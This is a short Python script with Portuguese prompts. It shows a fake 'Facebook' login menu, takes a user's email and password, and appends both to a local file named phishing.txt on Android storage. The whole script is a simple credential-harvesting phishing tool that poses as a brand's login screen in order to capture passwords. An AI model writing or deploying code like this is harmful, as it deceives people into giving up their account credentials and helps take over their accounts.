opcao = ''
while opcao != "2":
    print("____- Facebook -____ \n")
    print("[1] Fazer login")
    print("[2] Sair")
    opcao = input("Digite a opcao: ")
    if opcao == "1":
        email = input("Email: ")
        senha = input("Senha: ")
        arquivo = open("/storage/emulated/0/test/phishing.txt","a")
        arquivo.write(email+"\n"+senha+"\n")
        arquivo.close()